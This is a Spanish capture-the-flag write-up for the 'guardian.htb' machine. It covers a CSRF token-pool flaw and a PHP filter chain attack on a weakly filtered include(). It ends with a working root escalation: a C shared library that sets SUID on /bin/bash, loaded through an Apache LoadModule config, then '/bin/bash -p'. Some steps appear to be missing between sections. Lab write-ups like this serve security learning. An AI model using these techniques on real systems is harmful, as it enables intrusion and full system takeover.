## CSRF (Cross-Site Request Foreign) Attack

Los profesores pueden crear `Notices` (avisos), los cuales contienen unos links que serán visitados por el administrador.

![](/assets/machines/guardian.htb/images/e9c59ae8-0d82-4eec-93bd-675884181637.webp)

En este punto esta claro que hay explotar un CSRF. Al revisar la lógica de los tokens CSRF descubrí que el sistema admitía cualquier token generado por cualquier usuario.
```php
<?php

$global_tokens_file = __DIR__ . '/tokens.json';

function get_token_pool()
{
    global $global_tokens_file;
    return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
}

function add_token_to_pool($token)
{
    global $global_tokens_file;
    $tokens = get_token_pool();
    $tokens[] = $token;
    file_put_contents($global_tokens_file, json_encode($tokens));
}

function is_valid_token($token)
{
    $tokens = get_token_pool();
    return in_array($token, $tokens);
}
```

Por ejemplo, al acceder a la página `lecturer/notices/create.php` se crea un `csrf_token` que se añade al pool.
```php
$token = bin2hex(random_bytes(16));
add_token_to_pool($token);
```

Pero ese token puede luego ser utilizado por cualquier otro usuario.

## PHP Filter Chain Attack

En el panel de reportes se puede seleccionar un reporte y este se enviará el path del `.php` en una query `report`.

![](/assets/machines/guardian.htb/images/21400a73-5b96-4cb4-b9ad-5adc069bb809.webp)

Este reporte `reports/enrollment.php` será renderizado en la página por medio de la función `include`.

```php
<?php include($report); ?>
```

Aunque previo a esto se hace una sanitización muy pobre de la query `report`.

```php
$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}
```

El servidor bloquea nuestro ataque si la query:
* Contiene caracteres `..`
* No termina en `enrollment.php` o `academic.php`  o `financial.php`  o `system.php`.

En este punto intenté pasarle una URL, un FTP o incluso un SMB:
* `http://10.10.16.3/academic.php`
* `ftp://10.10.16.3/academic.php`
* `\\10.10.16.3\SHARE\academic.php`

Pero fue en vano, el servidor aunque hacia bypass de la sanitización no ejecutaba el código, así que pensé que tendría alguna configuración de php para evitar esto.

Después de investigar como hacer Local File Inclusion con el método `include`. Descubrí que se puede llegar a explotar por medio de `PHP filters chain`. En este caso estaremos usando el siguiente repositorio para generar el *payload* malicioso:
* https://github.com/synacktiv/php_filter_chain_generator

El funcionamiento de `PHP filters chains` interno es algo complejo, básicamente se aprovecha el wrapper `php://filter` con el parámetro `resource=php://temp` para a partir de ese punto formar un *payload* malicioso desde 0 es decir con un *string* vacío `''`. Ese *string* vacío iterará múltiples veces por diferentes *encodings*, los cuales al realizar la conversión añadirán un prefijo en cada iteración, esto prefijo añadido es algo que sucede en algunos *encondings*, por ejemplo el *encoding* `convert.iconv.UTF8.CSISO2022KR` añade una `C`.  Dicho esto, el script mapea cada carácter *base64* para así en base a iteraciones de encoding generar un *string* en *base64*, que será decodificado en base64 dando a conocer un *payload* malicioso en código PHP y ejecutado por el `include()`.

> *Cuando estuve investigando esto, me pareció increíble que a alguien se le ocurriera esto. Simplemente un genio.*

Si estáis interesados en profundizar en `PHP filters chain` os recomiendo encarecidamente el artículo:
* https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it

Bien, con el *exploit* generamos el *filter chain*.

![](/assets/machines/guardian.htb/images/af02ace6-46a7-4340-96c2-61fd9831428e.webp)

Dado que nuestro payload necesita pasar las medidas de seguridad añadimos `,system.php`.

```html

```

![](/assets/machines/guardian.htb/images/17d05c47-0724-4c3b-9040-5f25ca59ad79.webp)

Esta función hace un par de cosas:
 * Comprueba que el archivo comience por `Include` o `IncludeOptional` o `LoadModule`.
 * Que la siguiente palabra a `LoadModule` este o dentro de `/home/mark/confs` o que directamente no sea una ruta `/`. Esta comprobación no hay que tenerla en cuenta dado que ni siquiera pasaremos por aquí.

Según la [documentación](https://httpd.apache.org/docs/2.4/mod/mod_so.html) de Apache podemos cargar con `LoadModule` un `.so`. La forma que debería tener el `.conf` deber ser:

```
LoadModule status_module "modules/mod_status.so"
```

Crear un archivo `exploit.c`.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor)) void init() {
    setuid(0);
    system("chmod +s /bin/bash");
}
```

Compilar el código en una librería  `.so`.

```
$ gcc -shared -fPIC -o exploit.so exploit.c
```

Enviar el archivo `.so` a la máquina víctima y ejecuta `safeapache2ctl`.

![](/assets/machines/guardian.htb/images/d72979a4-da12-419c-b0b4-b7593c2910e0.webp)

Ahora que el binario bash tiene el SUID activado, podemos para obtener root.

```
/bin/bash -p
```
